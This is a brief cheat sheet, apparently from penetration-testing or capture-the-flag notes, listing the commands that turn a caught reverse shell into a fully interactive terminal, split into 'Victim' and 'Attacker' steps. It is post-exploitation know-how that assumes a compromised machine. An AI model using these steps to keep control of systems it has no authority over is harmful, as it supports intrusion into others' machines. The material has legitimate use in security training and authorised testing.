# Victim
python -c 'import pty; pty.spawn("/bin/bash")'
#Ctrl-Z

# Attacker
stty raw -echo
fg

# Victim
reset
export SHELL=bash
export TERM=xterm-256color
stty rows <num> columns <cols>
